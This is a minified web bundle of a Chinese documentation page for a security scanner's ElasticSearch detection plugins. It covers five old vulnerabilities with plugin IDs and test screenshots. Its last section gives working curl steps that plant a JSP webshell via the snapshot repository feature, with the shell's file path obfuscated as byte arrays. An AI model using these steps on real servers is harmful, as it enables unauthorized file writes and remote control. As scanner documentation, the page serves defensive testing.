"use strict";(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[191],{14951:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/ElasticSearch-1-8e9f9a91405e5e0d4dc19ae4144ca298.png"},15680:(e,t,n)=>{n.d(t,{xA:()=>o,yg:()=>d});var r=n(96540);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach(function(t){a(e,t,n[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))})}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},l=Object.keys(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var c=r.createContext({}),p=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},o=function(e){var t=p(e.components);return r.createElement(c.Provider,{value:t},e.children)},g="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},y=r.forwardRef(function(e,t){var n=e.components,a=e.mdxType,l=e.originalType,c=e.parentName,o=i(e,["components","mdxType","originalType","parentName"]),g=p(n),y=a,d=g["".concat(c,".").concat(y)]||g[y]||u[y]||l;return n?r.createElement(d,s(s({ref:t},o),{},{components:n})):r.createElement(d,s({ref:t},o))});function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var l=n.length,s=new Array(l);s[0]=y;var i={};for(var c in t)hasOwnProperty.call(t,c)&&(i[c]=t[c]);i.originalType=e,i[g]="string"==typeof e?e:a,s[1]=i;for(var p=2;p<l;p++)s[p]=n[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}y.displayName="MDXCreateElement"},29365:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/ElasticSearch-3-1ed64d4d28d7d1b93d737ea69f61909f.png"},39784:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/ElasticSearch-6-b991f4dbec14b3b621c76fe5687e8724.png"},46476:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/ElasticSearch-2-d9700d655fbb41e4f8646014e0969812.png"},55066:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/ElasticSearch-4-5c41971527e078d5816a423780773faa.png"},59070:(e,t,n)=>{n.r(t),n.d(t,{contentTitle:()=>s,default:()=>g,frontMatter:()=>l,metadata:()=>i,toc:()=>c});var r=n(58168),a=(n(96540),n(15680));const l={sidebar_position:17},s="ElasticSearch",i={unversionedId:"wiki/DetectionPlug-in/ElasticSearch",id:"wiki/DetectionPlug-in/ElasticSearch",isDocsHomePage:!1,title:"ElasticSearch",description:"1 CVE-2014-3120 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b",source:"@site/Yaklab/wiki/DetectionPlug-in/ElasticSearch.md",sourceDirName:"wiki/DetectionPlug-in",slug:"/wiki/DetectionPlug-in/ElasticSearch",permalink:"/Yaklab/wiki/DetectionPlug-in/ElasticSearch",tags:[],version:"current",sidebarPosition:17,frontMatter:{sidebar_position:17},sidebar:"teamSidebar",previous:{title:"Struts2\u63d2\u4ef6\u4f7f\u7528",permalink:"/Yaklab/wiki/DetectionPlug-in/struts2"},next:{title:"Laravel\u63d2\u4ef6\u4f7f\u7528",permalink:"/Yaklab/wiki/DetectionPlug-in/Laravel"}},c=[{value:"1 CVE-2014-3120 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b",id:"1-cve-2014-3120-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b",children:[]},{value:"2 CVE-2015-1427 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b",id:"2-cve-2015-1427-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b",children:[]},{value:"3 CVE-2015-3337 \u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u68c0\u6d4b",id:"3-cve-2015-3337-\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u68c0\u6d4b",children:[]},{value:"4 CVE-2015-5531 \u76ee\u5f55\u904d\u5386\u4e0e\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u68c0\u6d4b",id:"4-cve-2015-5531-\u76ee\u5f55\u904d\u5386\u4e0e\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u68c0\u6d4b",children:[]},{value:"5 WooYun-2015-110216 \u5199\u5165webshell\u6f0f\u6d1e",id:"5-wooyun-2015-110216-\u5199\u5165webshell\u6f0f\u6d1e",children:[]}],p={toc:c},o="wrapper";function g({components:e,...t}){return(0,a.yg)(o,(0,r.A)({},p,t,{components:e,mdxType:"MDXLayout"}),(0,a.yg)("h1",{id:"elasticsearch"},"ElasticSearch"),(0,a.yg)("h2",{id:"1-cve-2014-3120-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b"},"1 CVE-2014-3120 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"e8518ead-d759-4789-9531-73cb88c4eda7"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"\u5c06\u6d4b\u8bd5\u7f51\u7ad9\u5730\u5740\u8f93\u5165\u5230\u8be5\u63d2\u4ef6\u626b\u63cf\u76ee\u6807\u680f\uff0c\u4fee\u6539\u63d2\u4ef6\u7684\u989d\u5916\u53c2\u6570\u6dfb\u52a0\u7aef\u53e3\u53f7\n\u63d2\u4ef6\u6210\u529f\u68c0\u6d4b\u5230\u8be5\u6f0f\u6d1e"),(0,a.yg)("p",null,(0,a.yg)("img",{src:n(14951).A})),(0,a.yg)("h2",{id:"2-cve-2015-1427-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b"},"2 CVE-2015-1427 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"77975554-aa02-4d5d-b6dc-e960090b7288"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"\u5c06\u6d4b\u8bd5\u7f51\u7ad9\u5730\u5740\u8f93\u5165\u5230\u8be5\u63d2\u4ef6\u626b\u63cf\u76ee\u6807\u680f\uff0c\u4fee\u6539\u63d2\u4ef6\u7684\u989d\u5916\u53c2\u6570\u6dfb\u52a0\u7aef\u53e3\u53f7\n\u63d2\u4ef6\u6210\u529f\u68c0\u6d4b\u5230\u8be5\u6f0f\u6d1e"),(0,a.yg)("p",null,(0,a.yg)("img",{src:n(46476).A})),(0,a.yg)("h2",{id:"3-cve-2015-3337-\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u68c0\u6d4b"},"3 CVE-2015-3337 \u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u68c0\u6d4b"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"4da6b591-5b7f-46b3-8f5c-84af1445e32c"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"\u5c06\u6d4b\u8bd5\u7f51\u7ad9\u5730\u5740\u8f93\u5165\u5230\u8be5\u63d2\u4ef6\u626b\u63cf\u76ee\u6807\u680f\uff0c\u4fee\u6539\u63d2\u4ef6\u7684\u989d\u5916\u53c2\u6570\u6dfb\u52a0\u7aef\u53e3\u53f7\n\u63d2\u4ef6\u6210\u529f\u68c0\u6d4b\u5230\u8be5\u6f0f\u6d1e"),(0,a.yg)("p",null,(0,a.yg)("img",{src:n(29365).A})),(0,a.yg)("h2",{id:"4-cve-2015-5531-\u76ee\u5f55\u904d\u5386\u4e0e\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u68c0\u6d4b"},"4 CVE-2015-5531 \u76ee\u5f55\u904d\u5386\u4e0e\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u68c0\u6d4b"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"Yakit\u6b63\u5728\u52aa\u529b\u7f16\u5199~"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"\u5c06\u6d4b\u8bd5\u7f51\u7ad9\u5730\u5740\u8f93\u5165\u5230\u8be5\u63d2\u4ef6\u626b\u63cf\u76ee\u6807\u680f\uff0c\u4fee\u6539\u63d2\u4ef6\u7684\u989d\u5916\u53c2\u6570\u6dfb\u52a0\u7aef\u53e3\u53f7\n\u63d2\u4ef6\u6210\u529f\u68c0\u6d4b\u5230\u8be5\u6f0f\u6d1e"),(0,a.yg)("p",null,(0,a.yg)("img",{src:n(55066).A})),(0,a.yg)("h2",{id:"5-wooyun-2015-110216-\u5199\u5165webshell\u6f0f\u6d1e"},"5 WooYun-2015-110216 \u5199\u5165webshell\u6f0f\u6d1e"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"Yakit\u6b63\u5728\u52aa\u529b\u7f16\u5199~"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"\u9996\u5148\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7d22\u5f15\u6587\u6863\uff1a"),(0,a.yg)("pre",null,(0,a.yg)("code",{parentName:"pre",className:"language-go"},'curl -XPOST http://xx.xxx.xx.xx/yz.jsp/yz.jsp/1 -d\'\n{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}\n\'\n')),(0,a.yg)("p",null,"\u518d\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u5b58\u50a8\u5e93\uff0c\u5176\u4e2dlocation\u7684\u503c\u5373\u4e3a\u6211\u8981\u5199\u5165\u7684\u8def\u5f84\u3002"),(0,a.yg)("pre",null,(0,a.yg)("code",{parentName:"pre",className:"language-go"},'curl -XPUT \'http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp\' -d \'{\n     "type": "fs",\n     "settings": {\n          "location": "/usr/local/tomcat/webapps/wwwroot/",\n          "compress": false\n     }\n}\'\n\'\n')),(0,a.yg)("p",null,"\u5b58\u50a8\u5e93\u9a8c\u8bc1\u5e76\u521b\u5efa:"),(0,a.yg)("pre",null,(0,a.yg)("code",{parentName:"pre",className:"language-go"},'curl -XPUT "http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp/yz.jsp" -d \'{\n     "indices": "yz.jsp",\n     "ignore_unavailable": "true",\n     "include_global_state": false\n}\'\n')),(0,a.yg)("p",null,(0,a.yg)("img",{src:n(76643).A})),(0,a.yg)("p",null,"\u8bbf\u95ee",(0,a.yg)("a",{parentName:"p",href:"http://xx.x.x.xxx:xxxx//wwwroot/indices/yz.jsp/snapshot-yz.jsp"},"http://xx.x.x.xxx:xxxx//wwwroot/indices/yz.jsp/snapshot-yz.jsp"),"\n\u8fd9\u5c31\u662f\u6211\u4eec\u5199\u5165\u7684webshell\n\u8be5shell\u7684\u4f5c\u7528\u662f\u5411wwwroot\u4e0b\u7684test.jsp\u6587\u4ef6\u4e2d\u5199\u5165\u4efb\u610f\u5b57\u7b26\u4e32\n\u5982\uff1a",(0,a.yg)("a",{parentName:"p",href:"http://xx.x.x.xxx:xxxx/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success%EF%BC%8C%E6%88%91%E4%BB%AC%E5%86%8D%E8%AE%BF%E9%97%AE/wwwroot/test.jsp%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0success%E4%BA%86"},"http://xx.x.x.xxx:xxxx/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success\uff0c\u6211\u4eec\u518d\u8bbf\u95ee/wwwroot/test.jsp\u5c31\u80fd\u770b\u5230success\u4e86")),(0,a.yg)("p",null,(0,a.yg)("img",{src:n(39784).A})))}g.isMDXComponent=!0},76643:(e,t,n)=>{n.d(t,{A:()=>r});const r=n.p+"assets/images/ElasticSearch-5-bd32cc85d06721f13057d16fa74a76e6.png"}}]);